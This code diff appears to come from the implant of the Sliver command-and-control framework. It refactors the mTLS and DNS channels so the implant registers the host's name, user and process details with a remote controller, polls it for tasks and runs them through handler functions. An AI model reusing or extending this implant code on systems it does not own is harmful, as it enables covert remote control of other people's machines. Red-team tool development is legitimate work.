@@ -111,7 +111,7 @@ func mtlsConnect() error {
 	defer conn.Close()
 	mtlsRegisterSliver(conn)
 
-	send := make(chan pb.Envelope)
+	send := make(chan *pb.Envelope)
 	defer close(send)
 	go func() {
 		for envelope := range send {
@@ -127,7 +127,7 @@ func mtlsConnect() error {
 		}
 		if err == nil {
 			if handler, ok := handlers[envelope.Type]; ok {
-				go handler.(func(chan pb.Envelope, []byte))(send, envelope.Data)
+				go handler.(func(chan *pb.Envelope, []byte))(send, envelope.Data)
 			}
 		}
 	}
@@ -147,10 +147,35 @@ func dnsConnect() error {
 	log.Printf("Starting new session with id = %s\n", sessionID)
 	// {{end}}
 
+	send := make(chan *pb.Envelope)
 	recv := make(chan *pb.Envelope)
 	ctrl := make(chan bool)
-	dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
+	defer func() {
+		ctrl <- true // Stop polling
+		close(send)
+		close(recv)
+		close(ctrl)
+	}()
 
+	go func() {
+		for envelope := range send {
+			err := dnsSessionSend(dnsParent, sessionID, sessionKey, envelope)
+			if err != nil {
+				// {{if .Debug}}
+				log.Printf("Failed to send message %v\n", err)
+				// {{end}}
+			}
+		}
+	}()
+
+	go dnsSessionPoll(dnsParent, sessionID, sessionKey, ctrl, recv)
+
+	handlers := getSystemHandlers()
+	for envelope := range recv {
+		if handler, ok := handlers[envelope.Type]; ok {
+			go handler.(func(chan *pb.Envelope, []byte))(send, envelope.Data)
+		}
+	}
 	return nil
 }
 
@@ -170,7 +195,7 @@ func getReconnectInterval() time.Duration {
 	return time.Duration(reconnect) * time.Second
 }
 
-func getRegisterSliver() pb.Envelope {
+func getRegisterSliver() *pb.Envelope {
 	hostname, _ := os.Hostname()
 	currentUser, _ := user.Current()
 	data, _ := proto.Marshal(&pb.RegisterSliver{
@@ -184,7 +209,7 @@ func getRegisterSliver() pb.Envelope {
 		Pid:      int32(os.Getpid()),
 		Filename: os.Args[0],
 	})
-	envelope := pb.Envelope{
+	envelope := &pb.Envelope{
 		Type: pb.MsgRegister,
 		Data: data,
 	}
